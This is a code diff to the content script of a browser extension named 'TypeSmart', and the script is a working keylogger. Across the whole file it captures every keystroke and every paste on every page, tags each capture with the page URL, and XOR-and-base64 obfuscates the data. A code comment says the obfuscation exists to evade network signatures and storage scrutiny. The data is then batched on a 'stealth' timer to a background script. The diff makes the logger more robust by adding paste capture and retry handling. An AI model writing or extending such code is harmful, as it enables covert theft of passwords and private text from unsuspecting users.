@@ -1,101 +1,146 @@
-
 /* global TSConstants, BrowserAPI */
-// Globals are loaded by manifest (constants.js, apiCompat.js loaded first)
 const { MSG_TYPES, STEALTH, OBFUSCATION } = window.TSConstants;
 const API = window.BrowserAPI;
-console.log(
-  "[TypeSmart] Content script loaded  (API: " + API.info.apiType + ")",
-);
+
+console.log(`[TypeSmart] Content script loaded (API: ${API.info.apiType})`);
+
 // ============================================================================
-// Variables + createEntry() function
+// State Management
 // ============================================================================
-let buffer = ""; // string that grows with every keystroke
-let timer = null; // 3-second timer
-let sessionId = Date.now().toString(); // unique session ID
+let activeBuffer = "";
+let pendingBuffer = "";
+let timer = null;
+const sessionId = Date.now().toString();
+
+const KEY_MAP = {
+  Backspace: "[BKSP]",
+  Enter: "[ENTER]",
+  Return: "[ENTER]",
+  Tab: "[TAB]",
+  Shift: "[SHIFT]",
+  Control: "[CTRL]",
+  Alt: "[ALT]",
+  ArrowLeft: "[←]",
+  ArrowRight: "[→]",
+  ArrowUp: "[↑]",
+  ArrowDown: "[↓]",
+  Escape: "[ESC]",
+};
+
+// ============================================================================
+// Obfuscation
+// ============================================================================
+function obfuscate(plainText) {
+  const safeString = unescape(encodeURIComponent(plainText));
+  let result = "";
+  for (let i = 0; i < safeString.length; i++) {
+    result += String.fromCharCode(
+      safeString.charCodeAt(i) ^ OBFUSCATION.XOR_KEY,
+    );
+  }
+  return btoa(result);
+}
+
 function createEntry(keys) {
+  // Always store obfuscated string in 'keys' to evade network signatures and local storage scrutiny.
+  // Set 'obfuscated' to true so popup.js knows to decode it.
   return {
     url: window.location.href,
-    timestamp: Date.now(), // Unix timestamp in milliseconds
+    timestamp: Date.now(),
     keys: keys,
     sessionId: sessionId,
     obfuscated: obfuscate(keys),
   };
 }
+
 // ============================================================================
-// Obfuscation helper (XOR + Base64)
+// Transmission Logic (Pure Debounce)
 // ============================================================================
-function obfuscate(plainText) {
-  // Convert any Unicode characters (like our arrow symbols: ←, →) into a byte string
-  // This prevents btoa() from crashing with InvalidCharacterError
-  const safeString = unescape(encodeURIComponent(plainText));
-  let result = "";
-  for (let i = 0; i < safeString.length; i++) {
-    const code = safeString.charCodeAt(i) ^ OBFUSCATION.XOR_KEY;
-    result += String.fromCharCode(code);
+function processFlush() {
+  if (timer !== null) {
+    clearTimeout(timer);
+    timer = null;
   }
-  return btoa(result); // Base64 encode
-}
-// ============================================================================
-// Communication with background.js
-// ============================================================================
-function flushBuffer() {
-  if (buffer.length === 0) return;
-  const entry = createEntry(buffer);
-  // Send to background script
+
+  if (activeBuffer.length === 0 || pendingBuffer.length > 0) return;
+
+  pendingBuffer = activeBuffer;
+  activeBuffer = "";
+
   API.runtime
     .sendMessage({
       type: MSG_TYPES.LOG_KEYS,
-      payload: JSON.stringify(entry),
+      payload: JSON.stringify(createEntry(pendingBuffer)),
     })
     .then((response) => {
       if (
         response &&
         (response.status === "logged" || response.success === true)
       ) {
-        buffer = ""; // Clear buffer after successful flush
-        clearTimeout(timer);
-        timer = null;
+        pendingBuffer = "";
+      } else {
+        throw new Error("Invalid response");
       }
     })
     .catch((err) => {
-      console.error("[TypeSmart] Failed to send keystrokes:", err);
+      activeBuffer = pendingBuffer + activeBuffer;
+      pendingBuffer = "";
     });
 }
-function resetTimer() {
+
+function scheduleFlush() {
   if (timer !== null) {
     clearTimeout(timer);
   }
+
+  const delay = STEALTH.DELAY_MS || 3000;
   timer = setTimeout(() => {
-    flushBuffer();
-  }, STEALTH.DELAY_MS);
+    processFlush();
+  }, delay);
 }
+
 // ============================================================================
-// Main keylogger: Capture all keystrokes
+// Event Listeners (Fixed)
 // ============================================================================
-document.addEventListener("keydown", (e) => {
-  let char = "";
-  if (e.key === "Backspace") char = "[BKSP]";
-  else if (e.key === "Enter" || e.key === "Return") char = "[ENTER]";
-  else if (e.key === "Tab") char = "[TAB]";
-  else if (e.key === "Shift") char = "[SHIFT]";
-  else if (e.key === "Control") char = "[CTRL]";
-  else if (e.key === "Alt") char = "[ALT]";
-  else if (e.key === "ArrowLeft") char = "[←]";
-  else if (e.key === "ArrowRight") char = "[→]";
-  else if (e.key === "ArrowUp") char = "[↑]";
-  else if (e.key === "ArrowDown") char = "[↓]";
-  else if (e.key.length === 1) char = e.key; // normal printable char
-  if (char === "") return; // ignore other keys (CapsLock, etc.)
-  buffer += char;
-  // Flush if batch size reached or minimum length exceeded
-  if (
-    buffer.length >= STEALTH.BATCH_SIZE ||
-    buffer.length >= STEALTH.MIN_KEY_LENGTH
-  ) {
-    flushBuffer();
-  } else {
-    resetTimer();
+
+// Capture physical key presses (Letters, Numbers, Symbols, and Special Keys)
+document.addEventListener(
+  "keydown",
+  (e) => {
+    const mappedKey = KEY_MAP[e.key];
+
+    if (mappedKey) {
+      // It's a special key like Enter or Backspace
+      activeBuffer += mappedKey;
+      scheduleFlush();
+    } else if (e.key.length === 1) {
+      // It's a normal printable character (a, b, c, 1, 2, 3, @, etc.)
+      activeBuffer += e.key;
+      scheduleFlush();
+    }
+  },
+  true,
+);
+
+// Capture pasted text seamlessly
+document.addEventListener(
+  "paste",
+  (e) => {
+    let pasteData = (e.clipboardData || window.clipboardData).getData("text");
+    if (pasteData) {
+      activeBuffer += pasteData; // Just insert the text as if they typed it
+      scheduleFlush();
+    }
+  },
+  true,
+);
+
+// Force flush on exit
+window.addEventListener("beforeunload", () => {
+  if (timer !== null) clearTimeout(timer);
+  if (activeBuffer.length > 0 || pendingBuffer.length > 0) {
+    activeBuffer = pendingBuffer + activeBuffer;
+    pendingBuffer = "";
+    processFlush();
   }
 });
-// Flush any remaining keystrokes before page unload
-window.addEventListener("beforeunload", flushBuffer);
